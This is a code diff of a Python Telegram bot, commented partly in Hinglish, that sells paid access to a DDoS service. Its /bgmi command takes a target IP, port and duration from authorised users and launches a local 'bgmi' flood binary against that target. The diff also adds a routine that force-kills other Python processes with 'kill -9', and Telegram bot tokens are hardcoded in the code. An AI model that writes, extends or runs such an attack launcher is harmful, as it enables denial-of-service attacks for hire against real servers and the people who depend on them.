@@ -1,33 +1,22 @@
-#bgmiddoserpython
-
 import telebot
 import subprocess
-import datetime
 import os
 import time
 import requests
-import random
+import signal
 
-# Railway setup: keep_alive handles the port binding for web services
-try:
-    from keep_alive import keep_alive
-    keep_alive()
-except ImportError:
-    pass
-
-# Bot Token and Admin ID
-TOKEN = '8749691844:AAHGRQZ-Y6IoWeX-Ir82deDexj2u5TcNkao'
+# --- CONFIGURATION ---
+# Tera Bot Token
+TOKEN = '8749691844:AAF-YCPj_CsbiFM83vkGQ6kfCW20d6fADFE'
 bot = telebot.TeleBot(TOKEN)
+
+# Admin ID aur File settings
 admin_id = ["8787952549"]
-
 USER_FILE = "users.txt"
-LOG_FILE = "log.txt"
 
-# Ensure files exist
+# Ensure user file exists
 if not os.path.exists(USER_FILE):
     with open(USER_FILE, "w") as f: f.write("")
-if not os.path.exists(LOG_FILE):
-    with open(LOG_FILE, "w") as f: f.write("")
 
 def read_users():
     try:
@@ -36,80 +25,87 @@ def read_users():
     except:
         return []
 
-allowed_user_ids = read_users()
+# --- TERMINATOR LOGIC (Railway Conflict Fixer) ---
+def kill_other_instances():
+    """Conflict se bachne ke liye purane processes ko kill karta hai."""
+    print("🧹 Cleaning ghost processes...")
+    try:
+        current_pid = os.getpid()
+        # Doosre python processes ko dhoond kar kill karna
+        os.system(f"ps -ef | grep python | grep -v {current_pid} | awk '{{print $2}}' | xargs kill -9 2>/dev/null")
+    except:
+        pass
 
-# --- Handlers ---
+# --- HANDLERS ---
+
+@bot.message_handler(commands=['start'])
+def start_command(message):
+    bot.reply_to(message, "⚡ **Bot Active on Railway!**\n\nUsage: `/bgmi <ip> <port> <time>`\nAdmin: @SODHI_OWNER")
 
 @bot.message_handler(commands=['add'])
 def add_user(message):
     if str(message.chat.id) in admin_id:
-        cmd = message.text.split()
-        if len(cmd) > 1:
-            uid = cmd[1]
-            if uid not in allowed_user_ids:
-                allowed_user_ids.append(uid)
-                with open(USER_FILE, "a") as f: f.write(f"{uid}\n")
-                bot.send_message(message.chat.id, f"✅ User {uid} Added!")
-            else:
-                bot.send_message(message.chat.id, "❌ User already exists.")
+        parts = message.text.split()
+        if len(parts) > 1:
+            new_uid = parts[1]
+            with open(USER_FILE, "a") as f:
+                f.write(f"{new_uid}\n")
+            bot.reply_to(message, f"✅ User {new_uid} added.")
     else:
-        bot.send_message(message.chat.id, "❌ Admin only command.")
+        bot.reply_to(message, "❌ Admin only command.")
 
 @bot.message_handler(commands=['bgmi'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
-    if user_id in allowed_user_ids:
-        cmd = message.text.split()
-        if len(cmd) == 4:
-            target, port, duration = cmd[1], cmd[2], cmd[3]
-            bot.send_message(message.chat.id, f"🚀 ATTACK STARTED!\n\n🎯 Target: {target}\n🔗 Port: {port}\n⏳ Time: {duration}s")
-            try:
-                os.system("chmod +x bgmi")
-                full_command = f"./bgmi {target} {port} {duration} 500"
-                subprocess.Popen(full_command, shell=True) # Non-blocking to avoid bot freezing
-                bot.send_message(message.chat.id, "✅ Attack running in background.")
-            except Exception as e:
-                bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
-        else:
-            bot.send_message(message.chat.id, "📝 Usage: /bgmi <ip> <port> <time>")
-    else:
-        bot.send_message(message.chat.id, "🚫 No Access! Buy from @SODHI_OWNER")
-
-@bot.message_handler(commands=['start'])
-def start(message):
-    bot.send_message(message.chat.id, f"❄️ Welcome {message.from_user.first_name}!")
-
-# --- Polling Logic with Force Termination ---
-def run_bot():
-    print("Railway Instance Manager Starting...")
+    allowed_users = read_users()
     
-    # Random delay 5-15 seconds to prevent race condition between old and new container
-    wait_time = random.randint(5, 15)
-    print(f"Waiting {wait_time}s to allow previous instance to shut down...")
-    time.sleep(wait_time)
+    if user_id not in allowed_users and user_id not in admin_id:
+        bot.reply_to(message, "🚫 **Access Denied!**\nBuy from @SODHI_OWNER")
+        return
 
-    # Forcefully clear webhook and drop all pending updates that cause loops
+    cmd_parts = message.text.split()
+    if len(cmd_parts) == 4:
+        target, port, duration = cmd_parts[1], cmd_parts[2], cmd_parts[3]
+        bot.send_message(message.chat.id, f"🚀 **Attack Sent!**\n🎯 Target: `{target}:{port}`\n⏳ Time: `{duration}s`")
+        
+        try:
+            # Binary ko permission dena
+            os.system("chmod +x bgmi")
+            # Attack ko background mein chalana
+            subprocess.Popen(f"./bgmi {target} {port} {duration} 500", shell=True)
+        except Exception as e:
+            bot.reply_to(message, f"❌ Execution Error: {str(e)}")
+    else:
+        bot.reply_to(message, "📝 **Usage:** /bgmi <ip> <port> <time>")
+
+# --- MAIN ENGINE ---
+if __name__ == "__main__":
+    print("--- STARTING BOT ENGINE ---")
+    
+    # Purane instances kill karna
+    kill_other_instances()
+    
+    # Telegram session reset (Conflict rokne ke liye)
     try:
         requests.get(f"https://api.telegram.org/bot{TOKEN}/deleteWebhook?drop_pending_updates=true")
-        print("Telegram Session Reset: Success")
-    except Exception as e:
-        print(f"Session Reset Warning: {e}")
+        print("Telegram session reset done.")
+    except:
+        pass
 
+    # Stabilization delay
+    print("⏳ Stabilizing (10s)...")
+    time.sleep(10)
+
+    print("🚀 Bot is now Polling!")
     while True:
         try:
-            print("Starting Bot Polling...")
-            # Interval added to keep the CPU usage and request rate steady
-            bot.polling(none_stop=True, skip_pending=True, interval=3, timeout=60)
+            # Polling start
+            bot.polling(none_stop=True, skip_pending=True, interval=2, timeout=60)
         except Exception as e:
-            error_str = str(e)
-            print(f"Polling Error: {error_str}")
-            
-            if "Conflict" in error_str or "409" in error_str:
-                # If conflict happens, wait longer to let Railway kill the ghost process
-                print("CONFLICT: Waiting 25s for session expiry...")
-                time.sleep(25)
+            err = str(e)
+            print(f"Error: {err}")
+            if "Conflict" in err or "409" in err:
+                kill_other_instances()
+                time.sleep(20)
             else:
-                time.sleep(10)
-
-if __name__ == "__main__":
-    run_bot()
+                time.sleep(5)
